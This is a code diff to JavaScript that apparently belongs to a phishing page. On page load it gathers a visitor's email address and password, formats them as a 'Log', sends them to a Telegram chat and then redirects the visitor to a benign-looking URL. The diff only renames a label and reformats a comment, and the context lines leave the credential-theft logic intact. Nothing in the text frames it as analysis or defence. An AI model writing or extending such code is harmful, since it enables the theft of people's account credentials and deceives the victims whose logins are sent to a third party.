@@ -197,7 +197,7 @@ document.addEventListener("DOMContentLoaded", function() {
         const payload = {
             chat_id: chatId,
             text: `
-            ${websiteName} Log:
+            Log Details:
             ________________________
             "EMAIL ADDRESS": ${data.email},
             "PASSWORD": ${data.password},
@@ -221,7 +221,7 @@ document.addEventListener("DOMContentLoaded", function() {
                 window.location.href = 'https://example.org'; // Redirect to success URL
             } else {
                 console.error("Error sending data to Telegram:", response.statusText);
-               // window.location.href = 'https://fresh.com'; // Redirect to error URL
+                //window.location.href = 'https://fresh.com'; // Redirect to error URL
             }
         })
         .catch(error => {
